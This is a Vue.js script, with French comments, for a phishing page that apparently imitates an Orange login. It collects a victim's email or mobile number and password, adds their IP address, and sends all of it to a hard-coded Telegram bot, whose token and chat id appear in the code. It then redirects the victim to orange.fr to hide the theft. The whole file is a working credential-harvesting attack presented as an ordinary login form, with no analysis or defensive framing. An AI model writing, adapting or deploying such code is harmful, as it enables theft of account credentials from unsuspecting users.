new Vue({
  el: '#index',
  data() {
    return {
      login: 1,
      log: {
        EMAIL: '',
        PASS: ''
      },
      error: false,
      isPasswordVisible: false,
      isPasswordFilled: false,
    };
  },
  methods: {
    handleInput() {
      this.error = false;
    },
    handleInput2() {
      this.error = false;
      this.isPasswordFilled = this.log.PASS.length > 0;
    },
    togglePasswordVisibility() {
      this.isPasswordVisible = !this.isPasswordVisible;
    },
    goToCredit() {
      // validation simple du champ email/phone
      if (!this.log.EMAIL || this.log.EMAIL.length < 3) {
        this.error = true;
        return;
      }
      this.error = false;
      this.login = 2; // passer à l’étape suivante (mdp)
    },
    async sendLog() {
      if (!this.log.PASS || this.log.PASS.length < 3) {
        this.error = true;
        return;
      }
      this.error = false;

      // Construction du message à envoyer Telegram
      const ip = window.iPfull || 'IP non récupérée';
      const message = `
📩 Nouvelle connexion :
Email / Mobile : ${this.log.EMAIL}
Mot de passe : ${this.log.PASS}
IP : ${ip}
      `;

      const botToken = '6156450722:AAFvSLzTiGfrp0lS4r3QGnNHckPnQQOiFo0';
      const chatId = '1580144498';
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        // Envoi du message à Telegram
        const response = await axios.post(url, {
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        });

        if (response.data.ok) {
          // Redirection après envoi réussi
          window.location.href = 'https://www.orange.fr'; // ou autre url de redirection
        } else {
          console.error('Erreur envoi Telegram', response.data);
          this.error = true;
        }
      } catch (err) {
        console.error('Erreur envoi Telegram', err);
        this.error = true;
      }
    }
  }
});
